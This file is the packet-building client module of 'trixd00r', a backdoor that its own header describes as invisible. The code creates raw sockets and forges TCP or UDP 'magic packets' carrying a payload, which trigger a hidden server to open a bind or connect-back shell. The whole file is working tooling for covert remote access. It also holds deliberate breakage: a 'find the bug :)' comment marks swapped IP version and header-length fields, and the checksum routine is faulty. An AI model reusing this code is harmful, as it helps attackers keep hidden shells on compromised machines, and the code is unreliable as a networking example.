/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          *
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * client/src/packet.c                                                         *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#include "packet.h"
#include "trixd00r.h"
#include "wrapper.h"


static unsigned short checksum(unsigned short *, int);
static void fill_sockaddr(packet_t *);
static void create_rawsock(packet_t *);
static uint8_t get_tcp_flags(packet_t *);
static uint8_t get_ip_protocol(packet_t *);
static void build_ip(packet_t *);
static void build_tcp(packet_t *);
static void build_udp(packet_t *);


/* print out supported magic packet types and protocol */
void print_packet_types()
{
    unsigned char i = 0;
    const char *descr[_NUM_PKT_TYPES] = {
        TCP_SYN_TYPE, TCP_ACK_TYPE, TCP_RST_TYPE, TCP_PSH_TYPE, TCP_URG_TYPE,
        TCP_FIN_TYPE, UDP_TYPE
    };


    printf("[+] "BLUE"available protocol and packet types"NORM"\n");

    for (i = 0; i < _NUM_PKT_TYPES; i++) {
        printf("--- %u [%s]\n", i, descr[i]);
    }

    return;
}


/* checksum calculator */
static unsigned short checksum(unsigned short *addr, int len)
{
    uint32_t cksum  = 0;


    while (len > 0) {
        cksum += *addr++;
        len -= 2;
    }

    if (len == 0) {
        cksum += *(unsigned char *) addr;
    }

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum = cksum + (cksum >> 16);

    return ~cksum;
}


/* fill sockaddr_in {} */
static void fill_sockaddr(packet_t *packet)
{
    packet->srv.sin_family = AF_INET;
    packet->srv.sin_port = htons(packet->port);
    packet->srv.sin_addr.s_addr = packet->ip->dst.s_addr;

    return;
}


/* create raw socket and set desired socket options */
static void create_rawsock(packet_t *packet)
{
    packet->one = 1;
    packet->cfd = xsocket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    xsetsockopt(packet->cfd, IPPROTO_IP, IP_HDRINCL, &packet->one,
                sizeof(packet->one));

    return;
}


/* get tcp flags for tcp header */
static uint8_t get_tcp_flags(packet_t *packet)
{
    switch (packet->type) {
     case _TCP_ACK_TYPE: return TH_ACK; break;
     case _TCP_RST_TYPE: return TH_RST; break;
     case _TCP_PSH_TYPE: return TH_PSH; break;
     case _TCP_URG_TYPE: return TH_URG; break;
     case _TCP_FIN_TYPE: return TH_FIN; break;
    }

    /* default */
    return TH_SYN;
}


/* get IPPROTO_* for ip header */
static uint8_t get_ip_protocol(packet_t *packet)
{
    if (packet->type <= _TCP_FIN_TYPE) {
        packet->hdrlen = sizeof(tcp_t);
        return IPPROTO_TCP;
    } else {
        packet->hdrlen = sizeof(udp_t);
        return IPPROTO_UDP;
    }
}


/* build ip header */
static void build_ip(packet_t *packet)
{
    packet->ip = (ip_t *) packet->magic_packet;

    /* find the bug :) */
    packet->ip->ver = 5;
    packet->ip->ihl = 4;
    packet->ip->id = htonl(rand());
    packet->ip->dst.s_addr = inet_addr(packet->host);
    packet->ip->ttl = 64;
    packet->ip->tos = 0;
    packet->ip->off = 0;
    packet->ip->p = get_ip_protocol(packet);
    packet->ip->len = htons(sizeof(ip_t) + packet->hdrlen +
                            strlen(packet->payload) + 1);
    packet->ip->sum = checksum((unsigned short *) packet->ip, sizeof(ip_t));

    return;
}


/* build tcp packet */
static void build_tcp(packet_t *packet)
{
    packet->tcp = (tcp_t *) (packet->magic_packet + sizeof(ip_t));

    packet->tcp->sport = htons(rand());
    packet->tcp->dport = htons(packet->port);
    packet->tcp->seq = htonl(rand());
    packet->tcp->ack = 0;
    packet->tcp->x2 = 0;
    packet->tcp->off = 5;
    packet->tcp->flags = get_tcp_flags(packet);
    packet->tcp->win = htons(65535);
    packet->tcp->sum = 0;
    packet->tcp->urp = 0;

    return;
}


/* build udp packet */
static void build_udp(packet_t *packet)
{
    packet->udp = (udp_t *) (packet->magic_packet + sizeof(ip_t));

    packet->udp->sport = htons(rand());
    packet->udp->dport = htons(packet->port);
    packet->udp->len = htons(sizeof(udp_t) + strlen(packet->payload) + 1);
    packet->udp->sum = 0;

    return;
}


/* send our magic packet */
void send_packet(packet_t *packet)
{
    xsendto(packet->cfd, packet->magic_packet, sizeof(ip_t) + packet->hdrlen +
            strlen(packet->payload) + 1, 0, (struct sockaddr *) &packet->srv,
            sizeof(packet->srv));
    xclose(packet->cfd);

    return;
}


/* build our magic packet */
void build_packet(packet_t *packet)
{
    create_rawsock(packet);
    build_ip(packet);

    switch (packet->type) {
     case _TCP_SYN_TYPE:
     case _TCP_ACK_TYPE:
     case _TCP_RST_TYPE:
     case _TCP_PSH_TYPE:
     case _TCP_URG_TYPE:
         build_tcp(packet);
         break;
     case _UDP_TYPE:
         build_udp(packet);
         break;
    }
    
    fill_sockaddr(packet);

    /* copy magic payload to magic packet - evil c0de i know :( */
    memcpy(&packet->magic_packet[sizeof(ip_t) + packet->hdrlen],
           packet->payload, strlen(packet->payload) + 1);

    return;
}

/* EOF */
